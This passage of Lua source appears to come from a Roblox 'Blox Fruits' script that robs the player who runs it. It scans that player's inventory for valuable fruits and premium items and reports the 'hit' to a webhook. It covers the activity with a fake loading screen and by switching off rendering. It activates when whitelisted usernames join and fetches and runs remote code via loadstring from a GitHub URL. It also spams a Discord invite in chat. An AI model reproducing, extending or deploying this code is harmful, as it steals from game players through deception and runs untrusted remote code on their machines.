			local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed)
			task.wait(waitTime)
		end
	end

	-- Connect character listeners
	charAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
	charRemovingConn = LocalPlayer.CharacterRemoving:Connect(onCharacterRemoving)

	-- Initial setup if character already exists
	if LocalPlayer.Character then
		task.spawn(onCharacterAdded, LocalPlayer.Character)
	end

	-- Start the loop
	task.spawn(runMainLoop)

	-- Return cleanup function for the main loop
	return function()
		isLoopRunning = false
		if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end
		if charRemovingConn then charRemovingConn:Disconnect(); charRemovingConn = nil end
		if jumpCleanupFunc then jumpCleanupFunc() end -- Cleanup jump locks
		currentTable, currentSeat = nil, nil -- Clear state
	end
end

local function init()
	local placeId = game.PlaceId
	-- Check if in correct game/sea
	if placeId == 2753915549 then LocalPlayer:Kick("This script works only in Sea 2 or 3!"); return end
	if placeId ~= 4442272183 and placeId ~= 7449423635 then LocalPlayer:Kick("This script is meant for Blox Fruits only!"); return end

	-- Get initial inventory snapshot
	local inventory = getInventory()
	if not inventory then LocalPlayer:Kick("Error getting initial inventory."); return end

	-- Check if player has items worth notifying about
	local function checkInventoryForHit()
		local fruitsToHitSet = {}; for _, f in ipairs(FruitsToHit) do fruitsToHitSet[f] = true end
		for _, item in ipairs(inventory) do
			if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or item.Type == "Premium" then
				return true
			end
		end
		return false
	end

	if not checkInventoryForHit() then
		LocalPlayer:Kick("No valuable items detected for initial hit. (Alt Account Filter)")
		return
	end

	-- Initial actions if valuable items found
	task.spawn(function()
		task.wait(1)
		JoinTeam()
		task.spawn(createNotification) -- Show cosmetic loading UI
		sendWebhook(inventory)       -- Send the main hit webhook(s)
	end)

	-- State variables for activation logic
	local mainLoopStopper = nil -- Stores the cleanup function for the main loop
	local chatConnection = nil
	local externalUILoaded = false

	-- Function to run when an authorized player joins
	local function onPlayerAdded(player)
		if mainLoopStopper then return end -- Prevent activation if already running

		-- Check if joining player is whitelisted (only whitelisted trigger activation)
		local isWhitelisted = (Usernames and table.find(Usernames, player.Name))
		if not isWhitelisted then return end

		mainLoopStopper = function() end -- Set placeholder to prevent re-activation

		-- Spawn activation sequence
		task.spawn(function()
			-- Load External UI (optional, if URL is set)
			if not externalUILoaded then
				local success, err = pcall(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))() -- Ensure URL is correct/intended
				end)
				if not success then warn("Failed to load external UI:", err) else externalUILoaded = true end
			end
			task.wait(1) -- Wait a bit after UI load attempt

			-- Connect Chat Listener if not already connected
			if not chatConnection then
				chatConnection = Players.PlayerChatted:Connect(processChatCommand)
			end

			-- Disable Rendering & Start Main Loop
			RunService:Set3dRenderingEnabled(false)
			mainLoopStopper = startMainLoop() -- Store the actual cleanup function

			-- Initial Chat Message
			task.spawn(function()
				task.wait(2)
				sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
			end)
		end)
	end

	-- Connect listener for players joining
	local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded)

	-- Check already existing players
	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			onPlayerAdded(player)
		end
	end)

	-- Cleanup on local player leaving
	local localPlayerRemovingConn
	localPlayerRemovingConn = Players.PlayerRemoving:Connect(function(player)
		if player == LocalPlayer then
			-- Disconnect listeners
			if playerAddedConn then playerAddedConn:Disconnect() end
			if chatConnection then chatConnection:Disconnect() end
			-- Call the main loop cleanup function if it exists
			if mainLoopStopper and type(mainLoopStopper) == "function" then
				mainLoopStopper()
			end
			-- Disconnect self
			if localPlayerRemovingConn then localPlayerRemovingConn:Disconnect() end
		end
	end)
end

--[[ Script Entry Point ]]--
-- Use a unique variable for basic re-execution prevention
if not shared.ScriptExecuted_SharkyV2_FinalFormatted then
	shared.ScriptExecuted_SharkyV2_FinalFormatted = true
	task.spawn(function() -- Run init in a protected thread
		local success, errorMessage = pcall(init)
		if not success then
			warn("SCRIPT INIT ERROR:", errorMessage)
			task.spawn(function() -- Use another task.spawn for kick to avoid issues within pcall error handling
				LocalPlayer:Kick("Script Initialization Error: " .. tostring(errorMessage))
			end)
		end
	end)
end
